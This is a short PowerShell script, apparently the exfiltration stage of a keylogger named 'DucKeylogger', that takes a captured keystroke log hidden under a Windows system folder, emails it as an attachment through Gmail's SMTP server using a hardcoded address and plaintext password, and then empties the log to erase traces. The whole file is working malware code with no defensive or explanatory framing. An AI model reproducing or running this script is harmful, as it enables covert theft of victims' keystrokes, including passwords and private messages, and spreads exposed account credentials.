$FolderPath = "C:\Windows\PLA\System\Exceptions\" #Emplacement du payload
$PaydayName = "cGF5ZGF5.txt" # Payday en base6

$Username = "shawnheyli@gmail.com"
$EmailPassword = "NouKakTiMalaya"
$Attachment = "$FolderPath$PaydayName"
$EmailTo = "shawnheyli@gmail.com"
$EmailFrom = "shawnheyli@gmail.com"
$Subject = "DucKeylogger"
$Body = "Quack, Quack !!"
$SMTPServer = "smtp.gmail.com"
$SMTPMessage = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
$Attachment = New-Object Net.Mail.Attachment($Attachment)
$SMTPMessage.Attachments.Add($Attachment)
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword)
$SMTPClient.Send($SMTPMessage)

$Attachment.Dispose()

Set-Content $FolderPath$PaydayName -Value ""
#Remove-Item -Path $FolderPath$PayloadName -Force -Recurse 
